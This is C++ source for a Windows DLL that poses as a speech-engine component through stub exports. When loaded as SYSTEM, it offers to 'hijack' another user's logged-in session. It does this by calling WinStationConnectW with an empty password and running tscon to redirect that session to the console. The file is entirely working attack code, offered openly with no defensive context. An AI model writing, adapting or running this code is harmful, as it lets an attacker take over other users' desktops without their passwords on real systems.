#include <windows.h>
#include <wtsapi32.h>
#include <string>
#include <lmcons.h>
#include <tlhelp32.h>

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")

typedef BOOL (WINAPI *WINSTATIONCONNECTW)(HANDLE hServer, ULONG tId, ULONG sId, LPWSTR pPassword, BOOL bWait);

extern "C" {
    __declspec(dllexport) HRESULT WINAPI GetSpeechEngine(void** ppEngine) { return E_NOTIMPL; }
    __declspec(dllexport) HRESULT WINAPI GetExtension(void** ppExt) { return E_NOTIMPL; }
}

bool IsRunningAsSystem() {
    wchar_t buffer[UNLEN + 1];
    DWORD size = UNLEN + 1;
    if (GetUserNameW(buffer, &size)) {
        return (_wcsicmp(buffer, L"SYSTEM") == 0);
    }
    return false;
}

void RunSessionSwitcher() {
    Beep(2000, 200);
    
    HMODULE hWinsta = LoadLibraryW(L"winsta.dll");
    WINSTATIONCONNECTW WinStationConnectW = (WINSTATIONCONNECTW)GetProcAddress(hWinsta, "WinStationConnectW");

    PWTS_SESSION_INFOW pInfo = NULL;
    DWORD count = 0;

    if (WTSEnumerateSessionsW(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pInfo, &count)) {
        for (DWORD i = 0; i < count; i++) {
            if (pInfo[i].SessionId == 0 || pInfo[i].State == WTSListen) continue;

            LPWSTR pUser = NULL;
            DWORD bytes = 0;
            WTSQuerySessionInformationW(WTS_CURRENT_SERVER_HANDLE, pInfo[i].SessionId, WTSUserName, &pUser, &bytes);
            
            if (pUser && wcslen(pUser) > 0) {
                std::wstring userName(pUser);
                DWORD targetId = pInfo[i].SessionId;
                WTSFreeMemory(pUser);

                std::wstring prompt = L"Hijack Session: " + userName + L"?";
                if (MessageBoxW(NULL, prompt.c_str(), L"Hijacker", MB_YESNO | MB_SERVICE_NOTIFICATION) == IDYES) {
                    
                    // 1. THE RECOVERY: If we switch and the mouse is gone, we need to force
                    // the system to re-initialize the cursor on the current desktop.
                    // We do this by hitting the 'Console' specifically.
                    
                    for (int retry = 0; retry < 3; retry++) {
                        // Try API
                        if (WinStationConnectW) {
                            WinStationConnectW(WTS_CURRENT_SERVER_HANDLE, targetId, 1, (LPWSTR)L"", FALSE);
                        }

                        // Try the 'tscon' hammer with the /v flag for verbosity (sometimes helps alignment)
                        std::wstring cmd = L"C:\\Windows\\System32\\tscon.exe " + std::to_wstring(targetId) + L" /dest:console /v";
                        _wsystem(cmd.c_str());

                        // 2. MOUSE FIX: Attach the thread to the target desktop and force a cursor refresh
                        HDESK hInput = OpenInputDesktop(0, FALSE, GENERIC_ALL);
                        if (hInput) {
                            SetThreadDesktop(hInput);
                            ShowCursor(TRUE);
                            CloseDesktop(hInput);
                        }
                        
                        Sleep(500);
                    }
                    break;
                }
            }
        }
        WTSFreeMemory(pInfo);
    }
    if (hWinsta) FreeLibrary(hWinsta);
}

BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID res) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        if (IsRunningAsSystem()) {
            RunSessionSwitcher();
            TerminateProcess(GetCurrentProcess(), 0);
        }
    }
    return TRUE;
}